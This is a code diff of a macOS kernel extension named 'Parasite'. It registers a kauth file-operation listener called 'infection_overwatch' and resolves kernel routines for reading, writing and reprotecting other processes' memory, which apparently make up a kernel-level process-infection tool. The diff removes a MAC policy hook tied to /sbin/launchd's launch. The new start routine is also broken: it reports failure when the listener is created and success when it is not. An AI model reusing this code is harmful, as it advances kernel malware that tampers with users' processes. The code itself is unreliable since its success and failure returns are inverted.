@@ -8,8 +8,6 @@
 
 #include <mach/mach_port.h>
 #include <libkern/libkern.h>
-#include <security/mac_framework.h>
-#include <security/mac_policy.h>
 #include <sys/vnode.h>
 #include <sys/kauth.h>
 #include <kern/task.h>
@@ -21,9 +19,6 @@
 #define SOLVE_KERNEL_SYMBOL(string, pointer) if (solve_kernel_symbol((string), (void**)&(pointer))) { printf("Can't solve kernel symbol %s", (string)); return KERN_FAILURE;}
 
 struct kernel_info g_kinfo;
-static boolean_t kernel_symbols_solved = FALSE;
-
-static boolean_t listener_initialized = FALSE;
 static kauth_listener_t listener = NULL;
 
 static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)
@@ -47,89 +42,30 @@ static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_actio
     return KAUTH_RESULT_DEFER;
 }
 
-static int Parasite_vnode_check_exec_t(kauth_cred_t cred, struct vnode *vp, struct label *label, struct label *execlabel, struct componentname *cnp, u_int *csflags, void *macpolicyattr, size_t macpolicyattrlen)
-{
-    if (!kernel_symbols_solved) {
-        if (init_kernel_info()) return 0;
-        
-        SOLVE_KERNEL_SYMBOL("_get_map_min", _get_map_min)
-        SOLVE_KERNEL_SYMBOL("_get_task_map", _get_task_map)
-        SOLVE_KERNEL_SYMBOL("_mach_vm_region", _mach_vm_region)
-        SOLVE_KERNEL_SYMBOL("_mach_vm_protect", _mach_vm_protect)
-        SOLVE_KERNEL_SYMBOL("_vm_map_read_user", _vm_map_read_user)
-        SOLVE_KERNEL_SYMBOL("_vm_map_write_user", _vm_map_write_user)
-        
-        kernel_symbols_solved = TRUE;
-    }
-    
-    char path[MAXPATHLEN] = {0};
-    int path_length = sizeof(path);
-    
-    if (!listener_initialized) {
-        if (!vn_getpath(vp, path, &path_length)) {
-            if (!strcmp(path, "/sbin/launchd")) {
-                listener = kauth_listen_scope(KAUTH_SCOPE_FILEOP, &infection_overwatch, NULL);
-                
-                if (listener == NULL) {
-                    printf("[Parasite] Damn, could not create listener.");
-                } else {
-                    listener_initialized = TRUE;
-                }
-            }
-        }
-    }
-    
-    return 0;
-}
-
-static struct mac_policy_ops Parasite_policy_ops =
-{
-    .mpo_vnode_check_exec = (void *)Parasite_vnode_check_exec_t
-};
-
-static struct mac_policy_conf Parasite_policy_conf =
-{
-    .mpc_name            = "Parasite",
-    .mpc_fullname        = "Parasite Kernel Extension",
-    .mpc_labelnames      = NULL,
-    .mpc_labelname_count = 0,
-    .mpc_ops             = &Parasite_policy_ops,
-    .mpc_loadtime_flags  = MPC_LOADTIME_FLAG_UNLOADOK,
-    .mpc_field_off       = NULL,
-    .mpc_runtime_flags   = 0
-};
-
-static mac_policy_handle_t Parasite_policy_handle_t;
-
 kern_return_t Parasite_start(kmod_info_t *ki, void *d);
 kern_return_t Parasite_stop(kmod_info_t *ki, void *d);
 
 kern_return_t Parasite_start(kmod_info_t *ki, void *d)
 {
     printf("[Parasite] Hello, I'm in memory.\n");
-    if (!kernel_symbols_solved) {
-        if (init_kernel_info()) return 0;
-        
-        SOLVE_KERNEL_SYMBOL("_get_map_min", _get_map_min)
-        SOLVE_KERNEL_SYMBOL("_get_task_map", _get_task_map)
-        SOLVE_KERNEL_SYMBOL("_mach_vm_region", _mach_vm_region)
-        SOLVE_KERNEL_SYMBOL("_mach_vm_protect", _mach_vm_protect)
-        SOLVE_KERNEL_SYMBOL("_vm_map_read_user", _vm_map_read_user)
-        SOLVE_KERNEL_SYMBOL("_vm_map_write_user", _vm_map_write_user)
-        
-        kernel_symbols_solved = TRUE;
-    }
+    if (init_kernel_info()) return 0;
+    
+    SOLVE_KERNEL_SYMBOL("_get_map_min", _get_map_min)
+    SOLVE_KERNEL_SYMBOL("_get_task_map", _get_task_map)
+    SOLVE_KERNEL_SYMBOL("_mach_vm_region", _mach_vm_region)
+    SOLVE_KERNEL_SYMBOL("_mach_vm_protect", _mach_vm_protect)
+    SOLVE_KERNEL_SYMBOL("_vm_map_read_user", _vm_map_read_user)
+    SOLVE_KERNEL_SYMBOL("_vm_map_write_user", _vm_map_write_user)
     
     listener = kauth_listen_scope(KAUTH_SCOPE_FILEOP, &infection_overwatch, NULL);
     
     if (listener == NULL) {
         printf("[Parasite] Damn, could not create listener.");
     } else {
-        listener_initialized = TRUE;
+        return KERN_FAILURE;
     }
     
-    //    return mac_policy_register(&Parasite_policy_conf, &Parasite_policy_handle_t, d);
-    return listener != NULL ? KERN_SUCCESS : KERN_FAILURE;
+    return KERN_SUCCESS;
 }
 
 kern_return_t Parasite_stop(kmod_info_t *ki, void *d)
@@ -141,5 +77,5 @@ kern_return_t Parasite_stop(kmod_info_t *ki, void *d)
     
     printf("[Parasite] Goodbye memory.\n");
     
-    return mac_policy_unregister(Parasite_policy_handle_t);;
+    return KERN_SUCCESS;
 }
